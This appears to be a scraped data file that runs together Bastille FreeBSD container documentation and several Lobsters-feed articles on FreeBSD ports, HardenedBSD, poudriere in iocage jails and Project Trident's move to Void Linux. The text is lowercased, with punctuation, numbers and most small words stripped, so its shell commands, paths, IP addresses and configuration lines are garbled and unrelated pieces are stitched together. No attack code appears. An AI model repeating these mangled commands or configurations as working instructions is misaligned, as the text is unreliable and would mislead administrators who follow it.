bootstrap release update apply update automatically bootstrap command ensure required directory structure place download requested release requested release bootstrap download basetxz need base eg port src configure bastillebootstraparchives configuration file default value set base additional component added space separated without file extension bastille attempt fetch required archive found cache release directory downloaded artifact stored cacherelease directory bootstrapped release stored releasesrelease advanced want create custom basetxz use unsupported variant freebsd drop basetxz cachereleasebasetxz bastille bootstrap attempt extract use bootstrap subcommand generally used prepare system use case bootstrap command new freebsd version released want start building container version bootstrapping template github gitlab see bastille update ensure bootstrapped release include latest patch bastille create bastille create us bootstrapped release create lightweight container system create container simply provide name release private ip address optionally provide network interface name attach ip container creation name release bootstrapped ip interface optional ishmael bastille create folsom valid name folsom ip release syslogdflags s sendmailenable none cronflags j command create container assigning ip address new system ishmael bastille create folsom valid name folsom ip release syslogdflags s sendmailenable none cronflags j command create container assigning ip address new system vnet ishmael bastille create v vnetjail valid valid name ip interface release syslogdflags s sendmailenable none cronflags j inet command create container assigning ip address new system vnetenabled container attached virtual bridge interface connectivity bridge interface defined interface argument create command case vnet also requires custom devfs ruleset create file needed host system etcdevfsrules add include devfsruleshideall add include devfsrulesunhidebasic add include devfsrulesunhidelogin add include devfsrulesjail add path bpf unhide optionally bastille create thick create container private base sometimes referred thick container whereas shared base container thin ishmael bastille create folsom recommend using private ip address range container range include bastille host also us private address use different range container ie host us container use bastille best validate submitted ip valid generally use range container bastille start start container use bastille start command ishmael bastille start folsom folsom folsom created bastille stop stop container use bastille stop command ishmael bastille stop folsom folsom folsom removed bastille restart restart container use bastille restart command ishmael bastille restart folsom folsom folsom removed folsom folsom created bastille list subcommand show running container system ishmael bastille list jid ip address hostname path bastion bastion usrlocalbastillejailsbastionroot squid squid usrlocalbastillejailssquidroot nginx nginx usrlocalbastillejailsnginxroot folsom folsom usrlocalbastillejailsfolsomroot also list nonrunning container bastille list container manner list archived log downloaded template release backup providing j flag list alone result json output bastille service restart service inside container use bastille service command ishmael bastille service folsom postfix restart folsom postfixpostfixscript stopping postfix mail system postfixpostfixscript starting postfix mail system bastille cmd execute command within container use bastille cmd ishmael bastille cmd folsom p auxw folsom user pid cpu mem vsz r tt stat started time command root isj usrsbinsyslogd s root ssj usrsbincron root rj p auxw bastille pkg manage binary package within container use bastille pkg ishmael bastille pkg folsom install vimconsole gitlite zsh folsom updating freebsd repository catalogue folsom fetching metatxz b folsom fetching packagesitetxz mib processing entry freebsd repository update completed package processed repository date updating database digest format following package affected checked new package installed vimconsole gitlite zsh expat curl carootnss pcre gettextruntime indexinfo number package installed process require mib space mib downloaded proceed action yn snip pkg subcommand course install expectation fully leverage pkg manager mean install update upgrade audit clean autoremove etc ishmael bastille pkg upgrade bastion updating pkgbastillebsdorg repository catalogue bastion fetching metatxz b bastion fetching packagesitetxz kib processing entry pkgbastillebsdorg repository update completed package processed repository date checking upgrade candidate processing candidate candidate checking integrity done conflicting package date updating pkgbastillebsdorg repository catalogue fetching metatxz b fetching packagesitetxz kib processing entry pkgbastillebsdorg repository update completed package processed repository date checking upgrade candidate processing candidate candidate checking integrity done conflicting package date updating pkgbastillebsdorg repository catalogue fetching metatxz b fetching packagesitetxz kib processing entry pkgbastillebsdorg repository update completed package processed repository date checking upgrade candidate processing candidate candidate checking integrity done conflicting package date squid updating pkgbastillebsdorg repository catalogue squid fetching metatxz b squid fetching packagesitetxz kib processing entry pkgbastillebsdorg repository update completed package processed repository date checking upgrade candidate processing candidate candidate checking integrity done conflicting package date nginx updating pkgbastillebsdorg repository catalogue nginx fetching metatxz b nginx fetching packagesitetxz kib processing entry pkgbastillebsdorg repository update completed package processed repository date checking upgrade candidate processing candidate candidate following package affected checked installed package upgraded nginxlite number package upgraded kib downloaded proceed action yn nginx fetching kib checking integrity done conflicting nginx upgrading nginxlite creating group using existing group www creating user using existing user www nginx extracting may need manually remove usrlocaletcnginxnginxconf longer needed bastille destroy container destroyed thrown away easily created note container must stopped destroyed ishmael bastille stop folsom folsom folsom removed ishmael bastille destroy folsom deleting container folsom note container console log destroyed usrlocalbastillelogsfolsomconsolelog bastille template looking ready made cicd validated bastille template bastille support templating system allowing apply file pkgs execute command inside container automatically currently supported template hook limit include pre fstab pkg overlay sysrc service cmd planned template hook include pf log template created bastilleprefix template leverage template hook simply create new directory format projectrepo ie usernamebasetemplate mkdir p usrlocalbastilletemplatesusernamebasetemplate leverage template hook create uppercase file root template directory named hook want execute eg echo zsh vimconsole gitlite htop usrlocalbastilletemplatesusernamebasetemplatepkg echo usrbinchsh usrlocalbinzsh usrlocalbastilletemplatesusernamebasetemplatecmd echo usr usrlocalbastilletemplatesusernamebasetemplateoverlay template hook executed specific order require specific syntax work expected table outline order requirement supported format example limit resource value memoryuse include template pathurl http templateurl usernamebasetemplate pre binsh command mkdir p usrlocalpath fstab fstab syntax hostpath containerpath nullfs ro pkg portpkg name vimconsole zsh gitlite tree htop overlay path oneline etc usr sysrc sysrc command nginxenableyes service service command nginx restart cmd binsh command usrbinchsh usrlocalbinzsh planned format example rdr pf rdr entry rdr pas inet proto tcp port log path varlognginxaccesslog note sysrc requires quote quote escaped ie addition supporting template hook bastille support overlaying file container done placing file full path using template directory example may help think usrlocalbastilletemplatesusernamebase example template root filesystem overlay create etchosts etcresolvconf inside base template directory overlayed container note due way freebsd segregate userspace majority overlayed template file usrlocal general exception etchosts etcresolvconf etcrcconflocal populating usrlocal custom config file container use sure include usr template overlay definition eg echo etc usrlocalbastilletemplatesusernamebaseoverlay echo usr usrlocalbastilletemplatesusernamebaseoverlay example include anything etc usr inside template need list individual file include toplevel directory name control order operation applying template create bastillefile inside base template directory line file begin uppercase reference bastille command followed argument omitting target deduced template argument line beginning treated comment bastillefile example limit memoryuse install start nginx pkg nginx sysrc nginxenableyes service nginx restart copy file nginx cp www usrlocalwwwnginxdist create file server containing jail hostname cmd hostname usrlocalwwwnginxdisthostnametxt forward tcp port host port container rdr tcp applying template container must running apply template bastille includes template subcommand subcommand requires target template name covered previous section template name correspond directory name bastilletemplates directory ishmael bastille template folsom usernamebase folsom copying file copy complete installing package snip executing final command chsh user information updated template complete bastille top one simply run top container command interactive top interactive bastille htop one simply run htop inside container one quick dirty addition note wo nt work nt htop installed container bastille sysrc sysrc subcommand allows safely editing system configuration file container term allows u toggle onoff service option startup ishmael bastille sysrc nginx nginxenableyes nginx nginxenable yes see man sysrc info bastille console subcommand launch login shell container default passwordless root login provide additional argument username logged user user must created first ishmael bastille console folsom folsom freebsd generic thu sep utc welcome freebsd release note erratum http wwwfreebsdorgreleases security advisory http wwwfreebsdorgsecurity freebsd handbook http wwwfreebsdorghandbook freebsd faq http wwwfreebsdorgfaq question list http listsfreebsdorgmailmanlistinfofreebsdquestions freebsd forum http forumsfreebsdorg document installed system usrlocalsharedocfreebsd directory installed later pkg install enfreebsddoc language replace en language code like de fr show version freebsd installed freebsdversion uname please include output error message posting question introduction manual page man man freebsd directory layout man hier edit etcmotd change login announcement root folsom point logged container full shell access system use andor abuse like change made inside container limited container bastille cp subcommand allows efficiently copying file host container ishmael bastille cp tmpresolvconfcf etcresolvconf folsom tmpresolvconfcf usrlocalbastillejailsfolsomrootetcresolvconf nginx tmpresolvconfcf usrlocalbastillejailsnginxrootetcresolvconf squid tmpresolvconfcf usrlocalbastillejailssquidrootetcresolvconf tmpresolvconfcf bastille rdr bastille rdr allows configure dynamic rdr rule container without modifying pfconf assuming using interface private network enabled rdranchor rdr etcpfconf described networking section bastille rdr help usage bastille rdr target clear list tcp hostport jailport udp hostport jailport bastille rdr tcp bastille rdr list rdr inet proto tcp port port bastille rdr udp bastille rdr list rdr inet proto tcp port port rdr inet proto udp port port bastille rdr clear nat cleared bastille update update command target release instead container every container based release release updated container automatically updated well update container based release date ishmael bastille update targeting specified release looking updatefreebsdorg mirror mirror found fetching metadata signature done fetching metadata index done inspecting system done preparing download file done update needed update system update available install safe may want restart container updated live bastille upgrade subcommand let upgrade release new release depending workflow similar bootstrap ishmael bastille upgrade bastille verify subcommand scan bootstrapped release validates everything look order comprehensive check compare release known good index see error issue consider deleting rebootstrapping release noted release bootstrapped bastille validated using checksum release manifest archive fail validation used bastille zfs subcommand allows managing zfs attribute targeted container common usage includes setting container quota set quota ishmael bastille zfs folsom set builtin df ishmael bastille zfs df builtin df ishmael bastille zfs folsom df bastille export container exported archiving purpose easily note ufs system container must stopped export ishmael bastille export folsom exporting folsom compressed xz archive sending zfs data stream kib kib exported successfully bastille import container imported supported archive easily ishmael bastille import validating file file validation successful importing folsom compressed xz archive receiving zfs data stream kib kib container folsom imported successfully bastille clone bastille clone duplicate existing container please aware host specific key hash regenerated e g remove openssh host key avoid duplicate host key rm etcsshsshhost usage bastille clone target newjail newipadrress ishmael bastille clone sourcejail targetjail bastille mount bastille mount nullfs mount path host inside container us format fstab entry filesystem type option dump pas number optional default nullfs ro usage bastille mount target hostpath containerpath filesystemtype option dump passnumber ishmael bastille mount targetjail hostpath containerpath targetjail added hostpath containerpath nullfs ro bastille umount bastille umount unmount volume inside container usage bastille umount target containerpath ishmael bastille umount targetjail containerpath targetjail unmounted containerpath example create start console example creates start console container ishmael bastille create alcatraz release name alcatraz ip ishmael bastille start alcatraz alcatraz alcatraz created ishmael bastille console alcatraz alcatraz freebsd generic thu sep utc welcome freebsd release note erratum http wwwfreebsdorgreleases security advisory http wwwfreebsdorgsecurity freebsd handbook http wwwfreebsdorghandbook freebsd faq http wwwfreebsdorgfaq question list http listsfreebsdorgmailmanlistinfofreebsdquestions freebsd forum http forumsfreebsdorg document installed system usrlocalsharedocfreebsd directory installed later pkg install enfreebsddoc language replace en language code like de fr show version freebsd installed freebsdversion uname please include output error message posting question introduction manual page man man freebsd directory layout man hier edit etcmotd change login announcement root alcatraz root alcatraz p auxw user pid cpu mem vsz r tt stat started time command root isj usrsbinsyslogd s root ssj usrsbincron root rj p auxw root ij login pam login root sj csh csh root alcatraz project goal tool created initially mindset function form want simply prove concept sound real work real work sort metacontainerport system instead installing mysql port directly system would use bastille install mysql port within container template built mysql go dns server everything else port tree eventually would like bastille template created popular freebsdbased service plex medium server adblocking dns resolvers tiny ssh container dynamic web server complete nt want tell ca nt run within framework arbitrary limitation based think may may best way design system goal goal provide secure framework process service run isolated want limit scope reach bad actor want severely limit target area available anyone gained access networking tip tip port destination defined list eg rdr pas inet proto tcp port rule would redirect traffic host port roundrobin container ip port tip port redirect port eg rdr pas inet proto tcp port port rdr pas inet proto tcp port port rdr pas inet proto tcp port port tip nt worry much ip assignment initially spent time worrying ip address assign end come conclusion really nt matter pick private address done isolated network end matter map host port container port reliably community support found bug bastille please submit bastille issue tracker
199,Lobsters,freebsd,FreeBSD,Maintaining port modifications in FreeBSD,https://www.amoradi.org/2019/11/12/maintaining-port-modifications-in-freebsd.html,maintaining port modification freebsd,maintaining port modification freebsd introduction separate port using custom category creating new category patch patch note create physical port category patch using postupdate hook hook manual rebasing git rebase using port overlay portshaker ported port final thought,maintaining port modification freebsd introduction every often customization option provided port system suffice occasion need maintain fork desired port arises unfortunately considering pace port update necessitates constant timeconsuming watch stream update child port rebased parent port keep system uptodate post explore three way small number port maintained outoftree modification inspiration post missing module default disabled option enable separate port using custom category creating new category port tree possible copy existing port modify install separately place original port may also possible modified port virtual category copying port directory new name adding virtual category makefile new port make sure still update validcategories stated see patch patch note learn virtual category built used create physical port category create directory port tree case usrportscustom copy desired port modify category field makefile new port new category created custom modify etcmakeconf makeconf add validcategories category name new line replacing category name accordingly distinguish new port original port installing pkg specify category name like pkg install using poudriere http githubcomfreebsdpoudrierewiki edit usrlocaletcpoudriered makeconf instead etcmakeconf patch using postupdate hook poudriere run script various point called hook located usrlocaletcpoudrieredhookshooknamesh hook interested called portsupdate run port updated port u hook anything port tree including patch arbitrary port case maintain set patch separate directory following port tree directory structure allows diff patch work without extra handholding prepare patch copy file need modification another directory directory structure original port make change run diff save patch directory port tree poudriereportshead following command work make sure modify path accordingly cp orig make change makefile diff text u orig mypatchessysutils makefilepatch portsupdatesh able patch easily understand following line see patch manpage focusing filename determination section p flag strip slash file path make sure set appropriate number path example case appropriate since slash need remove get flag specifies directory contains sysutils content portsupdatesh reduced following binsh find mypatches type f name patch exec patch poudriereportshead make sure portsupdatesh appropriate permission eg execute every time poudriere update port port u personal patch applied manual rebasing git port managed git create branch modify file commit rebase origin whenever need update port tree way able resolve conflict occur git manage modification git checkout master git pull origin master git checkout mymodifications git rebase master using port overlay recently overlay functionality ported port tested seems adding makeconf jailname makeconf etcmakeconf make poudriere port use order instead original port tree port dependency needed exists overlay essence patch appears overlay dpoverlays portsdir treat overlay similarly original port tree require port present overlay final thought ended creating separate physical category port tree named custom worked well far allows original port modified one modified one installed one jail original installed elsewhere use workflow addition let know find fengshaun freenode irc
200,Lobsters,freebsd,FreeBSD,HardenedBSD November 2019 Status Report,https://hardenedbsd.org/article/shawn-webb/2019-11-09/hardenedbsd-status-report,hardenedbsd november status report,http,hardenedbsd lot news share nov oliver pinter resigned amicably project u hardenedbsd owe oliver gratitude appreciation humble project named oliver born thesis work collaboration shawn webb oliver created hardenedbsd repo github april hardenedbsd foundation formed five year later carry great work rebuild hardenedbsd build infrastructure performing following userfacing change hardenedbsdstablegit repo archived hardenedbsd still utilize hardenedbsdplaygroundgit repo collaboration third party extremely experimental code slowly transitioning fully selfhosted goal complete transition dec mean stop using github altogether downgrading community support given plate maintain right therefore community want support community need provide git commits performed infrastructure signed dev key think autosync script run every six hour random bit news currently working getting sync script running new infrastructure far likely take around another week reenable autosync package builder experiencing stability issue due upstream network change package failing sync package repos woefully outofdate actively working time permit eta updated repos ben la monica hardenedbsd foundation looking ldapkerberos integration infrastructure looking unify everything order enable finergrained control infrastructure along easier centralized management new build script coming along nicely one last change need make skip build commit happened last build freshly started one commit http build script track revision source tree used check whether update since last successful build end november hope turn build script portpackage goal able pkg install entire infrastructure given complete rebuild infrastructure longer use domain installerhardenedbsdorg primary mirror update website reflect change mirror operator due complete rebuild infrastructure yet reenabled rsync primary mirror taking different approach authentication provide example step convert existing configuration new one excruciatingly behind administrative side hardenedbsd donated reached please forgive tardiness know forgotten get soon hardenedbsd especially appreciate every contribution matter form come code money advocacy etc lastly like thank everyone patience know downtime extensive grateful opportunity serve community spare time thank providing opportunity serve
202,Lobsters,freebsd,FreeBSD,"EuroBSDCon 2019, Norway",http://www.youtube.com/playlist?list=PLskKNopggjc6NssLc8GEGSiFYJLYdlTQx,eurobsdcon norway,,
203,Lobsters,freebsd,FreeBSD,Please think architecture (2007),https://lists.freebsd.org/pipermail/freebsd-arch/2007-August/006763.html,please think architecture,please think architecture phk phkfreebsddk phk freebsdorg information freebsdarch mailing list,please think architecture poulhenning kamp phk phkfreebsddk wed aug pdt new laptop fujitsusiemens load acpifujitsu new sysctls appear hwacpifujitsulcdbrightness hwacpifujitsulcdbrightnessradix named wrong hwbacklightbrightness hwbacklightbrightnessradix something like backlighting vendor specific feature laptop lcd display generic stuff like end vendorspecific branch never grow generic tool handle backlightning instead tool vendor maddening list like list scsi controller devdconf set scsicontrollerregex aacadvadwahaahbahcahdaicamdamrasrbtcissctdpt espidaiiripsispmlxmlymptncrncvnspstgsymtrmwds please nt turn freebsd nightmare fragmented bit like linux poulhenning kamp unix since zilog zeus phk freebsdorg tcpip since rfc freebsd committer bsd since never attribute malice adequately explained incompetence information freebsdarch mailing list
204,Lobsters,freebsd,FreeBSD,Moving poudriere from the host into a jail,https://dan.langille.org/2019/10/23/moving-poudriere-from-the-host-into-a-jail/,moving poudriere host jail,poudriere jail create jail create dataset associating dataset jail prepare jail usage documentation code issue configuring official documentation experience multiple vnets kernel module time start jail setting jail copying configuration forget website configuration ready poudriere datasets start jail datasets change try loopback address missing distfiles installing package without package server linprocfs issue prepare jail poudriere usage pointed success jail thomas maack nielsen asking,post moving poudriere host jail could probably use creating new jail running poudriere also assumes use iocage use whatever jail tool want encounter problem please post comment see amend post post freebsd zfs poudriere iocage assume complete familiar topic basing work poudriere jail ezjail used instruction note instruction let jail inherit network detail want clear needed use vnet one bit allow progress create jail prefer thick jail recommend use anything persist day dan sudo iocage create r thickjail name successfully created usually set proper hostname sudo iocage set hosthostname create poudriere dataset assuming configuring poudriere first time need dataset creating sudo zfs create tankfastpoudriere associating poudriere dataset jail dataset mounted jail therefore need setting sudo zfs set jailedon tankfastpoudriere also need applied descendant datasets r option zfs set wrote script cat binzfssetjailedonpoudriere binsh filesystems zfs list hr name tankfastpoudriere f filesystems sudo zfs set jailedon f done running script set descendant get something like mount tankfastpoudrierecache permission denied setting jailedon also umount zfs dataset surprised longer mounted statement make sure manipulate poudriere dataset within jail please note really delay step jail running package installed keep old poudriere instance running available first dan sudo iocage set jailzfsdatasetpoudriere jailzfsdataset poudriere please note full name dataset mentioned man iocage take zfs filesystem name without pool name idea justcreated jail particular original value zfs dataset name seems default value according man page iocagejailsuuidrootdata prepare jail poudriere usage setting one command sudo iocage set allowmounttrue allowmounttmpfstrue allowmountdevfstrue allowmountprocfstrue mountlinprocfstrue allowmountzfstrue allowmountnullfstrue allowrawsocketstrue allowsocketaftrue allowchflagstrue vneton execpoststart jail childrenmax allowmount allowmounttmpfs allowmountdevfs allowmountprocfs mountlinprocfs allowmountzfs allowmountnullfs allowrawsockets allowsocketaf allowchflags enforcestatfs jailzfs vnet execpoststart usrbintrue jail note original version post set property deprecated instead use sysvmsg sysvsem sysvshm documentation say default disable code say default new raised issue explain execpoststart later configuring vnet note running multiple vnets may want case know first vnet proceed official documentation helped first iocage vnet experience getting dhcpd jail running helped deviated reference note set instead set sudo iocage set none sudo iocage set redacted none redacted sudo iocage set defaultrouter auto netmasks important without get error sorry record etcrcconf setting added clonedinterfaces addm main network card server multiple vnets running one vnet host might need something like sudo iocage set interface see default value interface assumes using using multiple vnets might need change using multiple vnets make change encountered error sudo iocage start starting started ok using devfsruleset configuring vnet failed route writing routing socket network unreachable add net default gateway fib network unreachable stopped due vnet failure kernel module first time encountered kldlist setting etcrcconf select everything listed howto think required poudriere issued command update etcrcconf sudo sysrc kldlist tmpfs aesni procfs kldlist tmpfs aesni procfs manually loaded module host sudo kldload tmpfs kldload ca nt load tmpfs module already loaded kernel sudo kldload aesni sudo kldload procfs kldload ca nt load procfs module already loaded kernel oh maybe need configuration setting think iocage loaded tmpfs need procfs kernel changed setting sudo sysrc kldlist tmpfs aesni kldlist tmpfs aesni procfs tmpfs aesni time start jail time start jail dan sudo iocage iocage start starting started ok using devfsruleset configuring vnet ok using ip option vnet starting service ok executing poststart ok next go onto console start installing need setting jail want set jail using ansible mean install thing poudriere jail need thing like enabled ssh installing packges jail need etc cover point nothing installed got started dan sudo iocage console freebsd generic welcome freebsd release note erratum http wwwfreebsdorgreleases security advisory http wwwfreebsdorgsecurity freebsd handbook http wwwfreebsdorghandbook freebsd faq http wwwfreebsdorgfaq question list http listsfreebsdorgmailmanlistinfofreebsdquestions freebsd forum http forumsfreebsdorg document installed system usrlocalsharedocfreebsd directory installed later pkg install enfreebsddoc language replace en language code like de fr show version freebsd installed freebsdversion uname please include output error message posting question introduction manual page man man freebsd directory layout man hier edit etcmotd change login announcement root everything need get host online including installing package list top level package installed dan pkg query e r sysutilsanvil sysutilsbeadm securitylogcheck sysutilsncdu wwwnginx securitypamsshagentauth portsmgmtpkg mailpostfix portsmgmtpoudriere langpython securitysudo sysutilstmux miscxtail everything installed start copying configuration assigning poudriere datasets jail copy configuration installing installation process create directory copy configuration copying configuration agree thing repo somewhere yet copied item old poudriere new poudriere first poduriereconf cd usrlocaletc sudo cp poudriereconf poudriered directory sudo cp r poudriered forget repo signing key get error error pkgreposigningkey defined file missing key checking existing poudriere system grep pkgreposigningkey usrlocaletcpoudriereconf pkgreposigningkeyusrlocaletcsslpkgkey l l usrlocaletcsslpkg rw root wheel nov usrlocaletcsslpkgcert rw root wheel nov usrlocaletcsslpkgkey sudo cp ia usrlocaletcsslpkg l l rw root wheel nov rw root wheel nov forget website configuration poudriere fantastic web interface also mechanism used deliver package network use nginx copied configuration file dan sudo cp usrlocaletcnginxnginxconf overwrite yn n dan within jail enable nginx command dan sudo sysrc nginxenable yes nginxenable yes might also want adjust nginxconf new jail appropriate jail ip addresesshostname etc ready poudriere datasets section associate poudriere dataset new jail first step stop jail sudo iocage stop stopping executing prestop ok stopping service ok tearing vnet ok removing devfsruleset ok removing jail process ok executing poststop ok stop jail get situation iocage try zfs umount stuff mounted fails crash stuck fixing manually command associate poudriere datasets jail dan sudo iocage set jailzfsdatasetpoudriere jailzfsdataset poudriere start jail poudriere datasets dan sudo iocage start starting started ok using devfsruleset configuring vnet ok using ip option vnet starting service ok executing poststart ok dan ssh console set sshd configuration described detailed previous section see dan zfs list name used avail refer mountpoint tankfast tankfast tankfastpoudriere usrlocalpoudriere tankfastpoudrierecache varcachemenot tankfastpoudrierecacheccache varcachemenotccache tankfastpoudrieredata usrlocalpoudrieredata tankfastpoudrieredatacache usrlocalpoudrieredatacache tankfastpoudrieredatacronjoblogs usrlocalpoudrieredatacronjoblogs tankfastpoudrieredatapackages usrlocalpoudrieredatapackages tankfastpoudrieredistfiles usrportsdistfiles tankfastpoudrierejails usrlocalpoudrierejails tankfastpoudriereports usrlocalpoudriereports tankfastpoudriereportsclean usrlocalpoudriereportsclean tankfastpoudriereportsdefault usrlocalpoudriereportsdefault tankfastpoudriereportsmain usrlocalpoudriereportsmain tankfastpoudriereportstesting usrlocalpoudriereportstesting dan see tankfast listed prefer see testing anything dan sudo zfs create tankfastdan create tankfastdan permission denied look good able get list port tree new jail dan poudriere port l portstree method timestamp path svn clean portsnap usrlocalpoudriereportsclean default svn usrlocalpoudriereportsdefault testing svn usrlocalpoudriereportstesting working svn usrhomedanportshead dan change poudriereconf made change usrlocaletcpoudriereconf new jail usetmpfs otherwise would see error dan sudo poudriere bulk p default j sysutilsanvil error kernsecurelevel poudriere requires securelevel able handle schg flag usetmpfsall override try done try skip page last section follows mostly debugging loopback address please note ignore section recorded interesting situation started using vnet dan usrlocaletcpoudriered poudriere jail l warning loopback address defined consider setting assigning loopback address jail jailname version arch method timestamp path ftp ftp dan usrlocaletcpoudriered added could possibly go wrong stopped jail assigned ip address sudo iocage set started jail tried different command dan sudo poudriere port u p default updating portstree default svn done dan success missing distfiles ran across error tried vnet vnet related something fix might apply let try build dan sudo poudriere bulk p default j z masterlist f usrlocaletcpoudrieredbuildlistsmasterlist error distfilescache directory exist cf poudriereconf eh dan grep distfilescache usrlocaletcpoudriereconf distfilescacheusrportsdistfiles dan l l usrportsdistfiles l usrportsdistfiles file directory dan ahh found dan zfs list tankfastdistfiles name used avail refer mountpoint tankfastdistfiles usrportsdistfiles let rename get included jail correct fileset first stop jail hit error runtimeerror unmount tankfastpoudrieredistfiles currently mounted manually kill jail sudo jail r somenumberyougetfromjls manually umount poudriere stuff get umounted stopped jail rename filesystem dan sudo zfs rename tankfastdistfiles tankfastpoudrieredistfiles jail started poudriere find distfiles dan sudo poudriere bulk p default j z masterlist f usrlocaletcpoudrieredbuildlistsmasterlist error kernsecurelevel poudriere requires securelevel able handle schg flag usetmpfsall override something already wrote previous section part fixed installing package without package server section also skipped unless need get package install new poudriere jail running yet case need install package new package server old package server offline let try usetmpfs dan usrlocaletc sudo joe poudriereconf sudo joe command found oh let install sudo pkg install joe updating local repository catalogue pkg http found repository local meta file using default setting pkg http found unable update repository local error updating repository oh yes fedexintunixathomeorg serve file mounted jail web server host time move web server jail package server offline via scp host nginx installed visit varcachepkg copy required package dan varcachepkg cp jail dan tmp sudo pkg add f skip website configuration installed editor modified usrlocaletcpoudriereconf set usetmpfs tried linprocfs issue skip section unless encountering issue linprocfs tried sudo poudriere bulk p default j z masterlist f usrlocaletcpoudrieredbuildlistsmasterlist creating reference jail done mounting system device mount linprocfs operation permitted cleaning unmounting file system checking jail host found dan iocage get grep procfs let set first stopping jail setting fail starting jail dan sudo iocage set mountlinprocfs enough permission granted jail viewed command issued host jls n j nodying hostnew linuxnew persist sysvmsgnew sysvsemnew sysvshmnew vnetnew allowchflags allownomlock allowmount allowmountdevfs allowmountnofdescfs allowmountnolinprocfs allowmountnullfs allowmountprocfs allowmounttmpfs allowmountzfs allownoquotas allowrawsockets allownoreadmsgbuf allowreservedports allowsethostname allowsocketaf allownosysvipc hostdomainnamenone linuxosnamelinux jail id jail original version post allownosysvipc present instead allowsysvipc seen changed configuration see prepare jail poudriere usage information look end line allowmountnolinprocfs negative form permission great mr lucas pointed linprocfs disabled could find way enable via iocage jail configuration item instead took approach sudo iocage set execpoststart jail execpoststart usrbintrue jail tell iocage issue command jail started command modifies jail set notice formal name jail must specified command specifically knew find formal name escape success build dan sudo poudriere bulk p default j c sysutilsanvil creating reference jail done mounting system device mounting portspackagesdistfiles stashing existing package repository mounting package appending makeconf usrlocaletcpoudrieredmakeconf appending makeconf usrlocaletcpoudriereddefaultmakeconf etcresolvconf starting jail log www http servicesunixathomeorgpoudrierebuildhtml loading moved port support flavor selectedoptions gathering port metadata calculating port order dependency c cleaning specified package build c delete existing package c flushing package deletion sanity checking repository checking package incremental rebuild need deleting stale symlinks done deleting empty directory done cleaning build queue sanity checking build queue processing priorityboost balancing pool recording filesystem state prepkg done building package using builder startingcloning builder hit ctrlt time see build progress stats building sysutilsanvil finished sysutilsanvil success stopping builder creating pkg repository creating repository tmppackages packing file repository committing package repository via latest symlink removing old package built port sysutilsanvil committing queued built failed skipped ignored tobuild time log www http servicesunixathomeorgpoudrierebuildhtml cleaning unmounting file system dan poudriere jail running poudriere jail long goal abandoned time ago grateful thomas maack nielsen asking led rabbit hole happy result
205,Lobsters,freebsd,FreeBSD,"Replacing an Oracle Server with FreeBSD, OpenZFS, and PostgreSQL",https://www.youtube.com/watch?v=HvzKW62KxIU,replacing oracle server freebsd openzfs postgresql,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature replacing oracle server freebsd openzfs postgresql youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature replacing oracle server freebsd openzfs postgresql youtube
206,Lobsters,freebsd,FreeBSD,FreeBSD at Work: Building Network and Storage Infrastructure with pfSense and FreeNAS,https://www.youtube.com/watch?v=rJkqTqnQJaA,freebsd work building network storage infrastructure pfsense freenas,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature freebsd work building network storage infrastructure pfsense freenas youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature freebsd work building network storage infrastructure pfsense freenas youtube
207,Lobsters,freebsd,FreeBSD,ELI5: ZFS Caching,https://www.youtube.com/watch?v=L_kBM_RHa6g,zfs caching,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature zfs caching youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature zfs caching youtube
208,Lobsters,freebsd,FreeBSD,State of the Hardened Union,https://www.youtube.com/watch?v=0L4AAKzBaTI,state hardened union,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature state hardened union youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature state hardened union youtube
209,Lobsters,freebsd,FreeBSD,Project Trident Proposes 2020 OS Migration To Void Linux,https://project-trident.org/post/os_migration/,project trident proposes o migration void linux,o migration background operating system requirement nonrequirements result runit libressl musl libc http wwwetalabsnetcomparelibcshtml xbps package manager migration benefit migration drawback conclusion,o migration background important reiterate project trident distribution existing operating system project trident never standalone operating system goal project trident enhancing usability operating system graphical workstation sort mean custom installers automatic setup routine graphical utility currently project trident based freebsd us trueos build framework year accumulated multiple longstanding issue underlying freebsd o issue hardware compatibility communication standard package availability continue limit project trident user many year waiting solution appear resolution horizon continue strive stated project goal make difficult decision shift focus move operating system better suit project trident trying deliver user operating system requirement stable reliable enduser experience several requirement project trident underlying operating system looking new base must able run completely package upstream o provider project want force user recompile kernel andor every package system configuration issue upstream application package must uptodate current state regularly updated future state timely manner project trident user continuously asking updated package want make sure choosing best solution need o must willing accept change outside contributor timely manner kind continuous integration system building testing proposed change preferred o must working graphical subsystem wellestablished desktop development community project trident seeking fill need want partner o help grow expand graphical desktop area writing tool utility speciallytailored o o must newer hardware support freebsd must also organized continually update hardware support timely manner o must sustainable longterm model project trident want offer stable environment people use many year since comfortable bsd system would prefer find system follows least loosely one thing well motto typically result larger collection small fast utility easier update individually without breaking entire system nonrequirements thing intentionally factor requirement new o size community want help o grow community helping develop new feature functionality still minimum size needed requirement looking steal user away wellestablished system zfsonroot preferred due experience using openzfs trueosfreebsd dealbreaker system provide zfsonroot support fact good opportunity project trident contribute back o adding support type installation result several month examination testing various operating system available right reached conclusion project trident rebasing void linux additional meeting o requirement flying color several feature void linux also attracted attention runit run impressed speed simplicity ease management init system libressl one initial feature project trident split trueos get shelved due change upstream freebsd greatly looking forward getting back using libressl default musl libc greatly impressed musl version libc wanted avoid locked using glibc tool unfamiliar quick comparison various libc version found http wwwetalabsnetcomparelibcshtml xbps package manager since system managed primarily package important ensure package management utility task xbps package manager seal deal fast reliable method interacting system package migration benefit change result many immediate benefit project trident better gpu driver support functional amd video card support amdgpu driver newer nvidia driver support many opensource graphic driver also become functional better sound card streaming support newer audio chipsets supported automatically streaming audio hdmi connection become functional better wireless support newer wifi chipsets supported wireless connection actually run proper connection speed protocol type n ac etc bluetooth support first time pt able start supporting leveraging bluetooth device due functional backend implementation o much newer version application endusers faster boot time hybrid efilegacy installation boot support migration drawback change initial drawback project loss trueos system configuration utility trueosfreebsd specific utility sysadm big problem may appear project trident already planned write replacement utility sysadm utility independently o migration loss familiar environment major change learning period new system downside temporary intend take time switchover lessen impact user want ensure thing right way instead following easy way continue working toward migration next several month planning announce release new void linux version project trident january might make earlyaccess alpha beta image available january please understand many thing unfinished actual release creating migration path freebsdbased project trident new voidbased version please prepared copy user data home temporary location like removable drive installing new version copying data back conclusion sum exciting time project trident tested void linux impressed look forward working operating system help project trident continue provide stable highquality graphical desktop experience quote 